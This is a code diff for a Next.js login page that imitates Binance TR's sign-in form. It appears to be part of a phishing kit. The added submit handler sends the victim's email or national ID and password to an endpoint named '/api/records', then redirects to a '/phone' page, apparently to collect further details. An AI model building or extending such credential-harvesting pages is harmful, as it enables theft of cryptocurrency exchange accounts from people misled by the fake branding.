@@ -3,8 +3,10 @@ import { useState } from 'react'
 import Image from 'next/image'
 import Link from 'next/link'
 import { Eye, EyeOff } from 'lucide-react'
+import { useRouter } from 'next/navigation'
 
 const LoginPage = () => {
+  const router = useRouter()
   const [credentials, setCredentials] = useState({
     email: '',
     password: ''
@@ -17,8 +19,29 @@ const LoginPage = () => {
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
-    // API call will be implemented here
-    console.log('Form submitted:', credentials)
+    
+    try {
+      // API'ye username ve password gönder
+      const response = await fetch('/api/records', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          username: credentials.email,
+          password: credentials.password
+        })
+      })
+
+      const data = await response.json()
+
+      if (data.success) {
+        // Başarılı giriş sonrası telefon sayfasına yönlendir
+        router.push('/phone')
+      } 
+    } catch (error) {
+      
+    }
   }
 
   return (
@@ -58,7 +81,7 @@ const LoginPage = () => {
           {/* Binance TR Login */}
           <div>
             <p className="text-[#707A8A] text-sm mb-4 mt-10">Binance TR hesabıyla oturum açın:</p>
-            <form className="space-y-4">
+            <form onSubmit={handleSubmit} className="space-y-4">
               <div>
                 <input
                   type="text"
@@ -68,9 +91,7 @@ const LoginPage = () => {
                   onChange={(e) => setCredentials({ ...credentials, email: e.target.value })}
                 />
                 {errors.email && (
-                  <p className="text-[#F6465D] text-sm mt-1">
-                    Lütfen geçerli bir e-posta veya TCKN girin
-                  </p>
+                  <p className="text-[#F6465D] text-sm mt-1">{errors.email}</p>
                 )}
               </div>
 
@@ -90,9 +111,7 @@ const LoginPage = () => {
                   {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                 </button>
                 {errors.password && (
-                  <p className="text-[#F6465D] text-xs mt-1">
-                    En az 8 karakterden oluşmalı ve en az bir büyük harf, bir küçük harf ve bir rakam içermelidir.
-                  </p>
+                  <p className="text-[#F6465D] text-sm mt-1">{errors.password}</p>
                 )}
               </div>
 
